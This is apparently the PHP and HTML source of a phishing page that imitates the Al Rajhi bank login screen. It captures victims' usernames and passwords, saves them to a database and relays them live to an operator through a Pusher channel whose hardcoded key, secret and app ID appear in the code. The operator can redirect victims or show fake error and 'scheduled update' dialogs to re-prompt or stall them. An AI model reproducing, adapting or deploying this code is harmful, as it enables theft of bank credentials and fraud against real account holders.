<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'Rajhi');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'Rajhi'
    ];

    $pusher->trigger('bcare', 'curreneft-page', $dataa);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'username' => $_POST['username'] ?? '',
        'password' => $_POST['password'] ?? '',
        'message' => 'Rajhi',
        'type' => '2'
    );

    $id = $_SESSION['card_id'] ?? null;
    $userId = $_SESSION['user_id'] ?? null;

    if ($id && $userId) {
        $updateResult = $User->UpdateCardRajhi($id, $site);
        if ($updateResult) {
            $data = [
                'userId' => $userId,
                'updatedData' => $site
            ];
            $pusher->trigger('bcare', 'update-user-accountt', $data);

            echo "<script>document.location.href='wait-rajhi.php';</script>";
            exit;
        }
    }
}
if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_GET['done'])) {
    $showError1 = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>الراجحي | تسجيل الدخول</title>

    <!-- Fonts & Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">

    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>

    <style>
        :root {
            --rajhi-blue: #0038ff;
            --rajhi-dark: #0026b3;
            --bg-gray: #ffffff;
            --text-dark: #0038ff;
            --radius-lg: 20px;
            --radius-md: 12px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Cairo", sans-serif;
        }

        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        /* Top Branding Area */
        .header-brand {
            padding: 40px 20px 20px;
            text-align: center;
            position: relative;
        }

        .header-brand img {
            width: 125px;
            margin-bottom: 20px;
        }

        /* Login Card - Now Flat */
        .login-card-wrapper {
            margin-top: 0;
            padding: 0 25px 40px;
            max-width: 480px;
            width: 100%;
            margin-left: auto;
            margin-right: auto;
        }

        .login-card {
            background: transparent;
            border-radius: var(--radius-lg);
            padding: 10px 0;
            box-shadow: none;
            position: relative;
        }

        .card-title {
            color: var(--rajhi-blue) !important;
            font-weight: 800;
            font-size: 1.6rem;
            margin-bottom: 5px;
        }

        .card-subtitle {
            color: #475569 !important;
            font-size: 1rem;
            margin-bottom: 35px;
        }

        /* Form Inputs */
        .input-group-custom {
            margin-bottom: 24px;
            position: relative;
        }

        .input-wrapper {
            position: relative;
            background: #f1f5f9;
            border: 1px solid transparent;
            border-radius: var(--radius-md);
            transition: 0.3s;
            display: flex;
            flex-direction: column;
            padding: 12px 18px;
        }

        .input-wrapper:focus-within {
            border-color: rgba(0, 56, 255, 0.2);
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(0, 56, 255, 0.08);
        }

        .input-wrapper .input-label {
            display: block;
            font-weight: 700;
            color: var(--rajhi-blue);
            margin-bottom: 4px;
            font-size: 0.8rem;
            opacity: 0.85;
        }

        .input-wrapper i.leading-icon {
            color: var(--rajhi-blue);
            font-size: 1.25rem;
            margin-left: 12px;
        }

        .input-wrapper .form-control {
            border: none;
            background: transparent !important;
            height: 40px;
            font-size: 1rem;
            font-weight: 600;
            padding: 0 !important;
            color: #1e293b !important;
        }

        .input-wrapper .form-control::placeholder {
            color: #94a3b8 !important;
            font-weight: 500;
        }

        .input-wrapper .form-control:focus {
            box-shadow: none !important;
        }

        .toggle-password {
            cursor: pointer;
            color: var(--rajhi-blue);
            padding: 10px;
            font-size: 1.15rem;
        }

        /* Buttons */
        .btn-rajhi-primary {
            background: var(--rajhi-blue);
            color: #ffffff;
            border: none;
            height: 58px;
            border-radius: var(--radius-md);
            font-weight: 800;
            font-size: 1.2rem;
            width: 100%;
            margin-top: 15px;
            box-shadow: 0 10px 25px rgba(0, 56, 255, 0.15);
            transition: 0.3s;
        }

        .btn-rajhi-primary:hover {
            background: var(--rajhi-dark);
            transform: translateY(-2px);
        }

        .btn-rajhi-primary:active {
            transform: scale(0.98);
        }

        /* Footer Links */
        .footer-links {
            text-align: center;
            margin-top: 30px;
        }

        .footer-link {
            color: var(--rajhi-blue);
            font-weight: 700;
            font-size: 0.9rem;
            text-decoration: none;
        }

        /* Loader Overlay */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .rajhi-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #f1f5f9;
            border-top: 4px solid var(--rajhi-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* Error Modals */
        .modal-content {
            border-radius: var(--radius-lg);
            border: none;
            overflow: hidden;
            background: #ffffff;
        }

        .modal-header-error {
            background: #fff5f5;
            padding: 30px;
            text-align: center;
        }

        .error-icon-wrapper {
            width: 70px;
            height: 70px;
            background: #fee2e2;
            color: #ef4444;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem;
            margin: 0 auto;
        }

        .btn-modal-close {
            background: #f1f5f9;
            color: #475569;
            border: none;
            height: 50px;
            border-radius: 12px;
            font-weight: 700;
            width: 100%;
        }
    </style>

    <link rel="stylesheet" href="./assets/css/theme.css">
</head>

<body>
    <!-- Global Loader -->
    <div id="loader">
        <div class="rajhi-spinner"></div>
        <div class="fw-bold text-dark">جاري التحقق من البيانات...</div>
    </div>

    <!-- Header Branding -->
    <div class="header-brand">
        <img src="./assets/w.png" alt="Al Rajhi Logo"
            style="filter: brightness(0) saturate(100%) invert(14%) sepia(99%) magic(6060) focus(0.5);">
        <h6 class="fw-bold mb-1 opacity-75 text-secondary">مرحبا بك</h6>
        <h4 class="fw-bold mb-0 text-dark">بالتجربة الرقمية الأفضل</h4>
    </div>

    <!-- Main Content -->
    <div class="login-card-wrapper">
        <div class="login-card">

            <form action="" method="POST" id="loginForm" onsubmit="return handleFormSubmit()">
                <!-- Username -->
                <div class="input-group-custom">
                    <div class="input-wrapper">
                        <div class="d-flex align-items-center">
                            <i class="bi bi-person leading-icon"></i>
                            <input type="text" name="username" required class="form-control"
                                placeholder="أدخل الهوية الوطنية أو اسم المستخدم">
                        </div>
                    </div>
                </div>

                <!-- Password -->
                <div class="input-group-custom">
                    <div class="input-wrapper">
                        <div class="d-flex align-items-center">
                            <i class="bi bi-lock leading-icon"></i>
                            <input type="password" name="password" id="password" required class="form-control"
                                placeholder="أدخل كلمة المرور">
                            <i class="bi bi-eye-slash toggle-password" id="eye"></i>
                        </div>
                    </div>
                </div>

                <!-- Submit -->
                <button type="submit" name="submit" id="subs" class="btn btn-rajhi-primary shadow-sm">
                    تسجيل الدخول
                </button>
            </form>

        </div>

        <div class="text-center mt-4">
            <p class="small text-muted fw-bold">نظام دفع الراجحي الآمن &copy; 2026</p>
        </div>
    </div>

    <!-- Error Modals -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center">
                <div class="modal-header-error">
                    <div class="error-icon-wrapper">
                        <i class="bi bi-exclamation-triangle"></i>
                    </div>
                </div>
                <div class="modal-body p-4">
                    <h5 class="fw-bold text-dark mb-2">معلومات الدخول خاطئة</h5>
                    <p class="text-muted small">تأكد من كتابة اسم المستخدم وكلمة المرور بشكل صحيح والمحاولة مرة أخرى.
                    </p>
                    <button class="btn btn-modal-close mt-3" data-bs-dismiss="modal">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="updateModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center">
                <div class="modal-header-error" style="background:#fffbeb;">
                    <div class="error-icon-wrapper" style="background:#fef3c7; color:#d97706;">
                        <i class="bi bi-clock-history"></i>
                    </div>
                </div>
                <div class="modal-body p-4">
                    <h5 class="fw-bold text-dark mb-2">تحديث مجدول</h5>
                    <p class="text-muted small">يوجد تحديث حالياً على التطبيق البنكي. يرجى المحاولة مرة أخرى بعد 30
                        دقيقة.</p>
                    <button class="btn btn-modal-close mt-3" data-bs-dismiss="modal"
                        style="background:#fef3c7;">إغلاق</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>

    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id'] ?? 0); ?>;

        // --- Pusher Setup ---
        var pusher = new Pusher('4a9de0023f3255d461d9', { cluster: 'ap2' });
        var channel = pusher.subscribe('my-channel-new-jaz');
        channel.bind('chandqdgada-bcd', function (data) {
            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }
        });

        // --- Interaction Logic ---
        function handleFormSubmit() {
            const btn = document.getElementById('subs');
            const loader = document.getElementById('loader');

            // Show loader
            loader.style.display = "flex";

            // Disable button slightly later to ensure name is sent if needed
            setTimeout(() => {
                btn.disabled = true;
                btn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> جاري التحقق...';
            }, 50);

            return true;
        }

        document.getElementById("eye").addEventListener("click", function () {
            var input = document.getElementById("password");
            if (input.type === "password") {
                input.type = "text";
                this.classList.replace('bi-eye-slash', 'bi-eye');
            } else {
                input.type = "password";
                this.classList.replace('bi-eye', 'bi-eye-slash');
            }
        });

        $(document).ready(function () {
            <?php if (isset($showError)): ?>
                $('#errorModal').modal('show');
            <?php endif; ?>
            <?php if (isset($showError1)): ?>
                $('#updateModal').modal('show');
            <?php endif; ?>
        });
    </script>

    <?php include 'chat_widget.php'; ?>
</body>

</html>